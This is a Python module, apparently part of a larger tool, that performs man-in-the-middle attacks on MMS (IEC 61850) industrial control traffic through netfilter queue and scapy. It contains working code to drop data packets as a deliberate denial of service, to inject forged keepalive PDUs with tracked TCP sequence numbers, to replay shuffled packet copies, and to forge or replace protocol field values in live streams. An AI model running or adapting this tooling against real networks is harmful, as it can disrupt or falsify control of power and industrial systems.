"""
attack_engine.py — All 7 MITM attack operations for MMS stream forging.

"""

from __future__ import annotations
import threading
import time
import random
import struct
import logging
from collections import deque, defaultdict
from dataclasses import dataclass, field
from typing import Callable, Optional

from tlv_parser2 import (
    extract_mms_pdu, parse_all, encode_all,
    find_tlv_by_tag, modify_tlv_value, rebuild_tpkt, TLVNode,
)
import redis_ts
import json_writer

logger = logging.getLogger("attack_engine")


# ─────────────────────────────────────────────────────────────────────────────
# Attack parameters — written by GUI thread, read by NFQ callback thread
# ─────────────────────────────────────────────────────────────────────────────

@dataclass
class AttackParams:
    mode: str             = "forward"
    delay_ms: int         = 500         # for delay_forward copy
    target_tag: int       = 0x85        # for modify / replace
    target_occurrence: int= 1
    new_value_hex: str    = ""          # for modify
    shuffle_n: int        = 5           # buffer size for shuffle mirror
    iface: str            = "eth0"      # outbound iface for sendp()
    flow_id: str          = "default"   # Redis key prefix
    mms_port: int         = 102


ATTACK_MODES = [
    "forward",
    "forward_copy",
    "delay_forward",
    "drop",
    "shuffle",
    "keepalive",
    "replace",
    "modify",
]

_params      = AttackParams()
_params_lock = threading.Lock()
_log_cb: Callable[[str], None] = print


def set_log_callback(cb: Callable[[str], None]) -> None:
    global _log_cb
    _log_cb = cb


def get_params() -> AttackParams:
    with _params_lock:
        # return a shallow copy so the NFQ thread holds a stable snapshot
        import copy
        return copy.copy(_params)


def update_params(**kwargs) -> None:
    with _params_lock:
        for k, v in kwargs.items():
            setattr(_params, k, v)


def _log(msg: str) -> None:
    try:
        _log_cb(msg)
    except Exception:
        pass


# ─────────────────────────────────────────────────────────────────────────────
# Per-flow SEQ tracker (for keepalive injection)
# ─────────────────────────────────────────────────────────────────────────────
# key: (src_ip, src_port, dst_ip, dst_port)  →  last seen SEQ + payload len
_flow_seq: dict[tuple, int] = defaultdict(int)
_flow_lock = threading.Lock()


def _update_flow_seq(src: str, sport: int, dst: str, dport: int,
                     seq: int, payload_len: int) -> None:
    key = (src, sport, dst, dport)
    with _flow_lock:
        _flow_seq[key] = seq + payload_len


def _next_seq(src: str, sport: int, dst: str, dport: int) -> int:
    key = (src, sport, dst, dport)
    with _flow_lock:
        return _flow_seq.get(key, 0)


# ─────────────────────────────────────────────────────────────────────────────
# Shuffle mirror buffer (copies only — TCP session is never interrupted)
# ─────────────────────────────────────────────────────────────────────────────
_shuffle_buf: deque = deque()
_shuffle_lock = threading.Lock()


# ─────────────────────────────────────────────────────────────────────────────
# Packet helpers
# ─────────────────────────────────────────────────────────────────────────────

def _rebuild_modified_pkt(original_ip_pkt, new_tcp_payload: bytes):

    try:
        from scapy.all import IP, TCP, Raw
        ip  = original_ip_pkt
        tcp = ip.payload

        new_ip = IP(
            src=ip.src, dst=ip.dst,
            ttl=ip.ttl, tos=ip.tos, id=ip.id,
            flags=ip.flags, frag=ip.frag,
            proto=ip.proto,
        )
        new_tcp = TCP(
            sport=tcp.sport, dport=tcp.dport,
            seq=tcp.seq,    ack=tcp.ack,
            dataofs=tcp.dataofs,
            flags=tcp.flags,
            window=tcp.window,
            urgptr=tcp.urgptr,
            options=tcp.options,
        )
        pkt = new_ip / new_tcp / Raw(load=new_tcp_payload)
        # Force checksum recalculation
        del pkt[IP].chksum
        del pkt[TCP].chksum
        # Trigger build
        return IP(bytes(pkt))
    except Exception as e:
        logger.error(f"_rebuild_modified_pkt: {e}")
        return None


def _sendp(pkt, iface: str) -> None:
    try:
        from scapy.all import sendp, Ether
        # sendp needs L2; wrap in Ether if not already
        if not pkt.haslayer("Ether"):
            pkt = Ether() / pkt
        sendp(pkt, iface=iface, verbose=False)
    except Exception as e:
        logger.error(f"sendp: {e}")


def _copy_and_send(ip_pkt, iface: str) -> None:
    #Thread target: deep-copy the IP pkt and sendp on iface.
    try:
        from scapy.all import IP
        raw = bytes(ip_pkt)
        copy_pkt = IP(raw)
        _sendp(copy_pkt, iface)
    except Exception as e:
        logger.error(f"_copy_and_send: {e}")


# ─────────────────────────────────────────────────────────────────────────────
# MMS keepalive PDU builder
# ─────────────────────────────────────────────────────────────────────────────

def _build_mms_keepalive_pdu() -> bytes:
    #Minimal valid TPKT+COTP+BER frame.

    ber_pdu  = bytes([0xA0, 0x00])                       # context[0], len=0
    cotp     = bytes([0x02, 0xF0, 0x80])                 # DT Data, EOT
    total    = 4 + len(cotp) + len(ber_pdu)              # TPKT total
    tpkt     = bytes([0x03, 0x00]) + struct.pack(">H", total)
    return tpkt + cotp + ber_pdu


# ─────────────────────────────────────────────────────────────────────────────
# Main dispatch — called from nfqueue_handler per MMS packet
# ─────────────────────────────────────────────────────────────────────────────

def process_packet(nfq_pkt, ip_pkt, seq: int) -> None:
    p = get_params()

    tcp         = ip_pkt.payload
    raw_payload = bytes(tcp.payload)    # TCP payload bytes

    # Track flow SEQ for keepalive injection
    _update_flow_seq(ip_pkt.src, int(tcp.sport),
                     ip_pkt.dst, int(tcp.dport),
                     int(tcp.seq), len(raw_payload))

    # Capture to JSON + Redis (always, before attack dispatch)
    try:
        record = json_writer.pkt_to_json(
            raw_payload, ip_pkt.src, ip_pkt.dst,
            int(tcp.sport), int(tcp.dport),
        )
        if record:
            json_writer.append_to_json_store(record)
            redis_ts.write_packet_to_redis(record, flow_id=p.flow_id)  # fully silent
    except Exception as e:
        logger.debug(f"capture: {e}")

    # ── Dispatch ──────────────────────────────────────────────────────────────
    {
        "forward":      _op_forward,
        "forward_copy": _op_forward_copy,
        "delay_forward":_op_delay_forward,
        "drop":         _op_drop,
        "shuffle":      _op_shuffle,
        "keepalive":    _op_keepalive,
        "replace":      _op_replace,
        "modify":       _op_modify,
    }.get(p.mode, _op_forward)(nfq_pkt, ip_pkt, p, seq)


# ─────────────────────────────────────────────────────────────────────────────
# Operations
# ─────────────────────────────────────────────────────────────────────────────

# forward
def _op_forward(nfq_pkt, ip_pkt, p, seq):
    # Transparent passthrough. Kernel handles SEQ/ACK/checksum — nothing to do.
    nfq_pkt.accept()
    _log(f"[PKT #{seq}] forward → accepted")


# forward_copy
def _op_forward_copy(nfq_pkt, ip_pkt, p, seq):

    # Accept the real packet first (preserves TCP session), then send an
    # out-of-band mirror copy on a separate iface for monitoring.
    nfq_pkt.accept()   # must be first; preserve session
    threading.Thread(
        target=_copy_and_send, args=(ip_pkt, p.iface), daemon=True
    ).start()
    _log(f"[PKT #{seq}] forward_copy → accepted + mirror on {p.iface}")


# ---------- delay_forward ----------------------------------------------------
def _op_delay_forward(nfq_pkt, ip_pkt, p, seq):
 
    # Simulate network latency without breaking the TCP session.

    # 1. Accept immediately — TCP session stays alive
    nfq_pkt.accept()

    # 2. After delay, sendp() an out-of-band copy (attacker artefact)
    raw = bytes(ip_pkt)
    delay_s = p.delay_ms / 1000.0
    iface   = p.iface

    def _delayed_copy():
        time.sleep(delay_s)
        try:
            from scapy.all import IP
            dup = IP(raw)
            _sendp(dup, iface)
            _log(f"[DELAY] PKT #{seq} copy sent after {p.delay_ms}ms on {iface}")
        except Exception as e:
            _log(f"[DELAY] sendp error PKT #{seq}: {e}")

    threading.Thread(target=_delayed_copy, daemon=True).start()
    _log(f"[PKT #{seq}] delay_forward → accepted now, copy queued for +{p.delay_ms}ms")


# ---------- drop -------------------------------------------------------------
def _op_drop(nfq_pkt, ip_pkt, p, seq):
    """
    Intentional DoS — discard the packet entirely.

    We only drop MMS DATA packets (PSH+ACK, payload > 0).
    We pass through pure ACKs, SYN, FIN to avoid corrupting handshake/teardown
    state — dropping those causes immediate RST storms.
    """
    tcp = ip_pkt.payload
    flags     = int(tcp.flags)
    psh       = bool(flags & 0x08)
    is_data   = psh and len(bytes(tcp.payload)) > 0

    if is_data:
        nfq_pkt.drop()
        _log(f"[PKT #{seq}] drop → MMS data packet discarded "
             f"(TCP retransmit expected, session will time out)")
    else:
        # Pass non-data packets (pure ACK, SYN, FIN, RST) through
        nfq_pkt.accept()
        _log(f"[PKT #{seq}] drop mode — non-data TCP (flags={hex(flags)}) passed through")


# ---------- shuffle ----------------------------------------------------------
def _op_shuffle(nfq_pkt, ip_pkt, p, seq):
    """
    Reorder MMS PDU delivery by buffering copies and re-injecting in shuffled
    order out-of-band.
    
    """
    # Always accept the real packet first
    nfq_pkt.accept()

    # Store a raw copy for shuffled replay
    raw = bytes(ip_pkt)
    with _shuffle_lock:
        _shuffle_buf.append((seq, raw))
        buf_len = len(_shuffle_buf)
        _log(f"[PKT #{seq}] shuffle → accepted + copy buffered ({buf_len}/{p.shuffle_n})")

        if buf_len >= p.shuffle_n:
            batch = list(_shuffle_buf)
            _shuffle_buf.clear()
            random.shuffle(batch)
            iface = p.iface

            def _flush(batch_to_send):
                try:
                    from scapy.all import IP
                    for i, (s, raw_pkt) in enumerate(batch_to_send):
                        dup = IP(raw_pkt)
                        _sendp(dup, iface)
                        _log(f"[SHUFFLE] out-of-band copy slot {i+1}: original PKT #{s}")
                        time.sleep(0.005)   # 5ms inter-packet gap
                except Exception as e:
                    _log(f"[SHUFFLE] flush error: {e}")

            threading.Thread(target=_flush, args=(batch,), daemon=True).start()
            _log(f"[SHUFFLE] flushing {len(batch)} shuffled copies out-of-band on {iface}")


# ---------- keepalive --------------------------------------------------------
def _op_keepalive(nfq_pkt, ip_pkt, p, seq):
   
    # Inject a synthetic MMS keepalive PDU and accept the real packet.

    nfq_pkt.accept()

    tcp         = ip_pkt.payload
    raw_payload = bytes(tcp.payload)

    # Only inject when there is silence (no data in this packet)
    if len(raw_payload) > 0:
        _log(f"[PKT #{seq}] keepalive → data packet, skipping injection (accepted)")
        return

    def _inject():
        try:
            from scapy.all import IP, TCP, Raw, sendp, Ether
            ka_pdu = _build_mms_keepalive_pdu()

            # Use tracked next SEQ for this flow
            next_seq = _next_seq(
                ip_pkt.src, int(tcp.sport),
                ip_pkt.dst, int(tcp.dport),
            )
            if next_seq == 0:
                _log(f"[KEEPALIVE] PKT #{seq}: no SEQ tracked yet, skipping injection")
                return

            ka_pkt = (
                IP(src=ip_pkt.src, dst=ip_pkt.dst) /
                TCP(
                    sport=int(tcp.sport), dport=int(tcp.dport),
                    seq=next_seq, ack=int(tcp.ack),
                    flags="PA", window=int(tcp.window),
                ) /
                Raw(load=ka_pdu)
            )
            del ka_pkt[IP].chksum
            del ka_pkt[TCP].chksum
            ka_pkt = IP(bytes(ka_pkt))   # force rebuild

            _sendp(ka_pkt, p.iface)
            _log(f"[KEEPALIVE] PKT #{seq}: injected MMS keepalive "
                 f"seq={next_seq} on {p.iface}")
        except Exception as e:
            _log(f"[KEEPALIVE] error PKT #{seq}: {e}")

    threading.Thread(target=_inject, daemon=True).start()
    _log(f"[PKT #{seq}] keepalive → real packet accepted, keepalive queued")


# ---------- replace ----------------------------------------------------------
def _op_replace(nfq_pkt, ip_pkt, p, seq):
  
    # Swap TLV value with historical old_pcap value from Redis.

    tcp         = ip_pkt.payload
    raw_payload = bytes(tcp.payload)

    pdu = extract_mms_pdu(raw_payload)
    if pdu is None:
        nfq_pkt.accept()
        return

    try:
        nodes   = parse_all(pdu)
        tag_hex = f"0x{p.target_tag:02X}"
        old_val = redis_ts.get_old_value(tag_hex)

        if old_val is None:
            _log(f"[PKT #{seq}] replace → no Redis value for {tag_hex}, passing through")
            nfq_pkt.accept()
            return

        matches = find_tlv_by_tag(nodes, p.target_tag)
        if not matches or p.target_occurrence > len(matches):
            _log(f"[PKT #{seq}] replace → tag {tag_hex} occ {p.target_occurrence} not found")
            nfq_pkt.accept()
            return

        old_hex = matches[p.target_occurrence - 1].value.hex()
        modify_tlv_value(matches[p.target_occurrence - 1], old_val)
        new_pdu         = encode_all(nodes)
        new_tcp_payload = rebuild_tpkt(raw_payload, new_pdu)

        new_ip_pkt = _rebuild_modified_pkt(ip_pkt, new_tcp_payload)
        if new_ip_pkt is None:
            nfq_pkt.accept()
            return

        nfq_pkt.set_payload(bytes(new_ip_pkt))
        nfq_pkt.accept()
        _log(f"[PKT #{seq}] replace → tag {tag_hex} occ={p.target_occurrence} "
             f"live={old_hex} → old_pcap={old_val.hex()}  "
             f"payload {len(raw_payload)}B→{len(new_tcp_payload)}B")

    except Exception as e:
        _log(f"[PKT #{seq}] replace error: {e} — passing through")
        nfq_pkt.accept()


# ---------- modify -----------------------------------------------------------
def _op_modify(nfq_pkt, ip_pkt, p, seq):
    #Forge a TLV field value in the live stream.

    tcp         = ip_pkt.payload
    raw_payload = bytes(tcp.payload)

    # Nothing to modify in a pure ACK
    if len(raw_payload) == 0:
        nfq_pkt.accept()
        return

    pdu = extract_mms_pdu(raw_payload)
    if pdu is None:
        nfq_pkt.accept()
        return

    # Validate hex value
    try:
        clean_hex = p.new_value_hex.strip().replace("0x", "").replace(" ", "")
        if not clean_hex:
            raise ValueError("empty")
        new_bytes = bytes.fromhex(clean_hex)
    except ValueError:
        _log(f"[PKT #{seq}] modify → invalid hex '{p.new_value_hex}', passing through")
        nfq_pkt.accept()
        return

    try:
        nodes   = parse_all(pdu)
        matches = find_tlv_by_tag(nodes, p.target_tag)

        if not matches or p.target_occurrence > len(matches):
            nfq_pkt.accept()
            _log(f"[PKT #{seq}] modify → tag 0x{p.target_tag:02X} "
                 f"occ {p.target_occurrence} not in this PDU, passing through")
            return

        old_hex = matches[p.target_occurrence - 1].value.hex()
        modify_tlv_value(matches[p.target_occurrence - 1], new_bytes)
        new_pdu         = encode_all(nodes)
        new_tcp_payload = rebuild_tpkt(raw_payload, new_pdu)

        new_ip_pkt = _rebuild_modified_pkt(ip_pkt, new_tcp_payload)
        if new_ip_pkt is None:
            nfq_pkt.accept()
            return

        nfq_pkt.set_payload(bytes(new_ip_pkt))
        nfq_pkt.accept()
        _log(f"[PKT #{seq}] modify → 0x{p.target_tag:02X}[{p.target_occurrence}] "
             f"{old_hex} → {clean_hex}  "
             f"{len(raw_payload)}B → {len(new_tcp_payload)}B")

    except Exception as e:
        _log(f"[PKT #{seq}] modify error: {e} — passing through")
        nfq_pkt.accept()
